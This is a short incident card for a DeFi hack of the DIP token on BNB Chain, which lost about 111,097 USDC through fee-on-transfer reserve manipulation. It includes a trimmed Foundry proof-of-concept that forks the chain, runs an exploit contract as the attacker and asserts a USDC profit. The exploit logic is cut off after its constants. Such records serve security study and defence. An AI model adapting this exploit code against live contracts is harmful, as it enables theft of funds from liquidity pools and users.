# [?] DIP - Fee-on-Transfer Reserve Manipulation

## Summary
Severity: Unknown
Chain: BNB Chain
Component: DIP
Published: 2026-06-16
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/DIP_exp.sol
Type: defi-exploit-poc

## Details
Lost: 111,097.59 USDC

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 104_598_278;
        vm.createSelectFork("bsc", forkBlock);
        fundingToken = USDC;

        vm.label(ATTACKER, "Attacker");
        vm.label(AIC, "AIC");
        vm.label(DIP, "DIP");
        vm.label(USDC, "USDC");
        vm.label(PANCAKE_ROUTER, "Pancake Router");
        vm.label(AIC_NEX_PAIR, "AIC/NEX Pair");
        vm.label(AIC_DIP_PAIR, "AIC/DIP Pair");
    }

    function testExploit() public balanceLog2(ATTACKER) {
        DipExploit exploit = new DipExploit(ATTACKER);
        vm.label(address(exploit), "Local Exploit Helper");

        uint256 usdcBefore = IERC20(USDC).balanceOf(ATTACKER);

        vm.prank(ATTACKER);
        exploit.execute();

        uint256 usdcProfit = IERC20(USDC).balanceOf(ATTACKER) - usdcBefore;
        emit log_named_decimal_uint("USDC profit", usdcProfit, 18);
        assertGt(usdcProfit, 100_000 ether, "DIP exploit should leave USDC profit");
    }
}

contract DipExploit {
    uint256 private constant FLASH_AIC_AMOUNT = 19_000_000 ether;
    uint256 private constant PANCAKE_FEE_DENOMINATOR = 10_000;
    uint256 private constant PANCAKE_FEE_ADJUSTED = 9_975;
    uint256 private constant DIP_SELL_FEE = 6;
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/DIP_exp.sol_
